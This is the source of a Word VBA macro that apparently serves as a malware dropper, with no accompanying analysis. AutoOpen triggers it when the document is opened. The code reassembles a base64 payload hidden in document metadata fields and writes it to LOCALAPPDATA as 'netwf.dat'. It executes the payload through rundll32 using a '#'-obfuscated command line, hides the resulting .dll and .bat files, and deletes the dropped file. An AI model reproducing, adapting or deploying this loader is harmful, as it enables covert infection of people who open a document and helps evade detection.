Sub AutoOpen()
    Execute
End Sub

Private Function DecodeBase64(base64) As Byte()
    Const decodeTable = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
          
    If 0 <> Len(base64) Mod 4 Then
        Exit Function
    End If
      
    outputLen = (Len(base64) / 4) * 3
    If "=" = Mid(base64, Len(base64), 1) Then
        outputLen = outputLen - 1
    End If
    If "=" = Mid(base64, Len(base64) - 1, 1) Then
        outputLen = outputLen - 1
    End If
      
    Dim decodedBytes() As Byte
    ReDim decodedBytes(outputLen - 1)
    outputIndex = 0
          
    For quartet = 1 To Len(base64) Step 4
        groupBase64Number = 0
        Const base = 64
        realBytesInThisGroup = 3
        For i = 0 To 3
           inputChar = Mid(base64, quartet + i, 1)
           indexInTable = 0
        
           If "=" = inputChar Then
                realBytesInThisGroup = realBytesInThisGroup - 1
           Else
                indexInTable = InStr(1, decodeTable, inputChar, vbBinaryCompare) - 1
           End If
                 
           If -1 = indexInTable Then
                Exit Function
           End If
             
           groupBase64Number = (groupBase64Number * base) + indexInTable
        Next
      
        groupBase64Number = Hex(groupBase64Number)
            
        'add leading zeroes, lengt of hex = 6:
         groupBase64Number = String(6 - Len(groupBase64Number), "0") & groupBase64Number
            
        'split hex number into 3 groups, 2 hex characters each:
        decodedBytes(outputIndex) = CByte("&H" & Mid(groupBase64Number, 1, 2))
        outputIndex = outputIndex + 1
        If realBytesInThisGroup > 1 Then
            decodedBytes(outputIndex) = CByte("&H" & Mid(groupBase64Number, 3, 2))
            outputIndex = outputIndex + 1
            If realBytesInThisGroup > 2 Then
                decodedBytes(outputIndex) = CByte("&H" & Mid(groupBase64Number, 5, 2))
                outputIndex = outputIndex + 1
            End If
        End If
    Next
      
    DecodeBase64 = decodedBytes
End Function
     
Private Sub Execute()
    Dim Path As String
    Dim FileNum As Long
    Dim bin() As Byte
    Dim cmdLine As String
    Const HIDDEN_WINDOW = 1
    strComputer = "."
    
    'extract and decode encoded file
    Subject = ActiveDocument.BuiltInDocumentProperties.Item("Subject")
    Subject = Right(Subject, Len(Subject) - 50)
    
    Company = ActiveDocument.BuiltInDocumentProperties.Item("Company")
    Company = Right(Company, Len(Company) - 50)
    
    Category = ActiveDocument.BuiltInDocumentProperties.Item("Category")
    Category = Right(Category, Len(Category) - 50)
    
    Hyperlink_base = ActiveDocument.BuiltInDocumentProperties.Item("Hyperlink base")
    Hyperlink_base = Right(Hyperlink_base, Len(Hyperlink_base) - 50)
    
    Comments = ActiveDocument.BuiltInDocumentProperties.Item("Comments")
    Comments = Right(Comments, Len(Comments) - 50)
    
    
    base64 = Subject + Company + Category + Hyperlink_base + Comments
    bin = DecodeBase64(base64)

    'save decoded file
    Path = Environ("LOCALAPPDATA") + "\" + "netwf" + ".dat"
    
    PathPld = Environ("LOCALAPPDATA") + "\" + "netwf" + ".dll"
    PathPldBt = Environ("LOCALAPPDATA") + "\" + "netwf" + ".bat"
    
    If Dir(PathPld, vbHidden) <> "" Then
        Exit Sub
    End If
    
    FileNum = FreeFile
    Open Path For Binary Access Write As #FileNum
    Put #FileNum, 1, bin
    Close #FileNum
        
    cmdLine = "C:\" + "###" + "Win" + "###" + "dow" + "###" + "s\Sy" + "###" + "ste" + "###" + "m32\" + "run" + "###" + "dll" + "32" + "#" + ".exe " + """" + Path + """" + "###" + ",KlpSvc"
    WordBasic.[Shell] Replace(cmdLine, "#", "")
    
    If Dir(PathPld) <> "" Then
       SetAttr PathPld, vbHidden
    End If
    
    If Dir(PathPldBt) <> "" Then
         SetAttr PathPldBt, vbHidden
    End If
    
    If Dir(Path) <> "" Then
         Kill Path
    End If

End Sub

